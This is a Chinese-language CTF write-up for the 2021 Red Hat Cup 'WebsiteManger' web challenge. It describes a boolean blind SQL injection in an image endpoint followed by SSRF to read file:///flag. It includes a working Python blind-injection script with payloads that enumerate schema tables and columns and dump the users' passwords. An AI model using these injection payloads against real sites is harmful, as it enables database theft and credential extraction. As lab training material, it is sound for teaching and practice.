# 原创
：  2021红帽杯 WebsiteManger

# 2021红帽杯 WebsiteManger

#### 2021红帽杯 WebsiteManger

## 考点

> 
布尔盲注、SSRF


## 思路

> 
尝试一般的登录方法没得用处，F12查看，登录框没有sql注入的利用点，发现还有一张图片，好家伙，sql注入的利用点在图片上


> 
当id的值为0时没有图片回显，利用布尔盲注得到用户密码：14348d305648989c355433b9a04dffce，用户名为：admin，登录进去一个很明显的ssrf考点


> 
猜测 flag在根目录下：`file:///flag`


## Payload

> 
盲注脚本


```
import string
import requests

allstr = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~'

url = 'http://challenge-faceca08e0d9acf7.sandbox.ctfhub.com:10800/image.php'

flag=''
for i in range(1,100):
    length=len(flag)
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            break

        #payload="if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'),{},1))&lt;{},sleep(0.5),1)".format(i,j)
        #payload="0/**/or/**/if(ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),{},1))&lt;{},1,0)".format(i,j)
        #payload="0/**/or/**/if(ascii(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name='users'),{},1))&lt;{},1,0)".format(i,j)
        payload="0/**/or/**/if(ascii(substr((select/**/group_concat(password)from/**/users),{},1))&lt;{},1,0)".format(i,j)
        params={
            'id':payload
        }
        r=requests.get(url=url,params=params)
        if len(r.text)&gt;200:
            max=j
        else :
            min=j

```
